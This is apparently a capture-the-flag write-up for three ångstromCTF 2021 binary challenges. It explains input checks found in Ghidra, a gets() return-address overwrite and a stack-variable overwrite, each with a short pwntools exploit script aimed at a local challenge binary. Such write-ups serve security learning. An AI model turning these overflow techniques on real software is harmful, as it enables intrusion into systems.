### ångstromCTF 2021 - FREE FLAGS!!1!! (50 points)

The file is a 64-bit x84-64 ELF executable. Use Ghidra to analyze the content. I renamed some variable names to make the program more readable. 

![](https://github.com/chuang76/writ3up/blob/main/angstrom/actf-p3-1.PNG?raw=true)

In order to get the flag, we need to make

```
input1 = 0x7a69
input2 + input3 = 0x476, input2 * input3 = 0x49f59 
input4 = "banana"
```

Now we can write the exploit as follows. Note that the first scanf() takes "%d" as the parameter, so we need to input 0x7a69 in the decimal format, i.e., 31337. To get the possible answers of the input2 and input3, we can use some online calculators such as http://gadget.chienwen.net/x/math/solveeq to solve the quadratic equation. We then input 419 (input2) and 723 (input3) to bypass the check. Lastly, send the string "banana" to make the input4 equals to the target string. 

```python
import pwn 
proc = pwn.process("./free_flags")
proc.read()
proc.sendline("31337")      
proc.read()
proc.sendline("419 723")
proc.read()
proc.sendline("banana")
proc.read()
```

Here is the flag.

![](https://github.com/chuang76/writ3up/blob/main/angstrom/actf-p3.PNG?raw=true)



### ångstromCTF 2021 - tranquil (70 points)

The file is a 64-bit x84-64 ELF executable. The function `win()` open the file `flag.txt` and read the content for us. So our goal is to force the program execute the `win()` function. The main function calls the function ` vuln()`. However, there is a `gets()` function, which may cause stack overflow, in the `vuln()`. Let's use radare2 to figure out how many bytes should we cover to exploit the stack and control the flow. As you can see, we need to cover 0x40 + 8 (rbp size), and overwrite the return address as 0x401196. So the exploit is as follows. 

![](https://github.com/chuang76/writ3up/blob/main/angstrom/actf-p1-1.PNG?raw=true)

![](https://github.com/chuang76/writ3up/blob/main/angstrom/actf-p1-2.PNG?raw=true)

```python
import pwn 
proc = pwn.process("./tranquil")
proc.read()
payload = b"a" * (0x40 + 8) + pwn.p64(0x401196, endian='little')
proc.sendline(payload)
proc.read()
```

![](https://github.com/chuang76/writ3up/blob/main/angstrom/actf-p1.PNG?raw=true)



### ångstromCTF 2021 - Sanity Checks (80 points)

The file is a 64-bit x84-64 ELF executable. Use Ghidra to analyze the content. To bypass the check, we can create a craft stack with the `gets()` function to make the variables equal to their target values. 

![](https://github.com/chuang76/writ3up/blob/main/angstrom/actf-p2-1.PNG?raw=true)

![](https://github.com/chuang76/writ3up/blob/main/angstrom/actf-p2-2.PNG?raw=true)

So let's use radare2 to figure out the addresses of the variables. As you can see, [rbp-0x60] should be overwritten as "password123", [rbp-0x4] should be overwritten as 0x32, [rbp-0x8] should be overwritten as 0x37, [rbp-0xc] should be overwritten as 0xf5, [rbp-0x10] should be overwritten as 0x3d. 

![](https://github.com/chuang76/writ3up/blob/main/angstrom/actf-p2-3.PNG?raw=true)

![](https://github.com/chuang76/writ3up/blob/main/angstrom/actf-p2-4.PNG?raw=true)

```python
import pwn 
proc = pwn.process("./checks")
proc.read()
pw = "password123"
payload = pw + "\x00" * (0x4c - len(pw)) + ("\x11\x00\x00\x00\x3d\x00\x00\x00\xf5\x00\x00\x00\x37\x00\x00\x00\x32\x00\x00\x00")
proc.sendline(payload)
proc.read()
```

Here is the flag. 

![](https://github.com/chuang76/writ3up/blob/main/angstrom/actf-p2.PNG?raw=true)